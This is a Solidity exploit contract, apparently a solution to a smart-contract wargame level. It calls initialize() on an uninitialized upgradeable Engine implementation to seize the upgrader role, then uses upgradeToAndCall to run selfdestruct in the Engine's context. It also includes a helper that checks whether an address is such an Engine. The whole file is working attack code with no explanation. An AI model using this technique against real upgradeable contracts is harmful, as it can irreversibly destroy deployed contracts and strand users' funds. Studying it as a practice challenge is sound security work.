// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
}

contract EngineAttacker {
    function exploit(address engine) external {
        // Initialize the Engine if not already initialized
        IEngine(engine).initialize();
        
        // Check if we're the upgrader
        require(IEngine(engine).upgrader() == address(this), "Not upgrader");
        
        // Upgrade to this contract and self-destruct
        IEngine(engine).upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("destroy()")
        );
    }
    
    function destroy() external {
        selfdestruct(address(0));
    }
    
    // Function to check if an address has the Engine interface
    function isEngine(address addr) external view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        
        if (size == 0) return false;
        
        try IEngine(addr).horsePower() returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }
}